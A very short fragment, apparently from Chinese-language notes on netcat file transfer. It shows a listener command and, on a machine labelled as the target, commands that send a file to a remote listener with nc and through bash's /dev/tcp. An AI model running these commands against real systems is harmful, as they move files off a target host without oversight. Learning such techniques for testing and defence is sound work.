	>nc –lvnp 333 >1.txt
	目标机
	>nc –vn 192.168.1.2 333 <test.txt –q 1
	&
	>cat 1.txt >/dev/tcp/1.1.1.1/333